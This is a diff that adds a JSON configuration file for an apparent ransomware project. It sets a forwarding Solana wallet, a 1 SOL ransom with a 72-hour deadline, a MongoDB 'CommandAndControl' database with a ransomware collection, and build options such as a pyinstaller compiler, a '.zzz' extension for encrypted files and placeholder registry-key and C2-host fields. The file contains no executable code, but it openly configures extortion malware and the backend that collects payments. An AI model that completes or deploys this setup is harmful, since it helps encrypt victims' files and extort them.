@@ -1,0 +1,25 @@
+{
+    "ratelimit_every": 100,
+    "ratelimit_reset": 10,
+    "forwarder": {
+        "foward_address": "SOLANA_ADDRESS",
+        "min_forward": 0.95,
+        "transaction_threshold": 0.05
+    },
+    "c2": {
+        "ransom_amount_sol": 1,
+        "ransom_deadline_hours": 72
+    },
+    "database": {
+        "connection_uri": "mongodb://localhost:27017",
+        "database_name": "CommandAndControl",
+        "collection_ransomware": "Ransomware",
+        "connection_timeout_seconds": 90
+    },
+    "ransom": {
+        "compiler": "pyinstaller",
+        "encryption_extension": ".zzz",
+        "registry_key": "",
+        "c2_host": ""
+    }
+}
